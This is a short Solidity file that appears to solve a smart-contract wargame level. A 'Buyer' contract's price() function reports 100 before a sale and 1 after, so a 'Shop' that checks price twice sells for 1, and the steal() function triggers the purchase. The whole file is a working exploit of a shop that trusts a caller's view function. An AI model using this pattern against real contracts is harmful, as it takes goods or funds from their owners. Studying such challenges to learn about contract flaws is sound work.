pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {

    Shop shop;

    constructor(address shopAddress) public{
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        bool isSold = shop.isSold();

        if (isSold){
            return 1;
        } else {
            return 100;
        }
    }

    function steal() public {
        shop.buy();
    }
}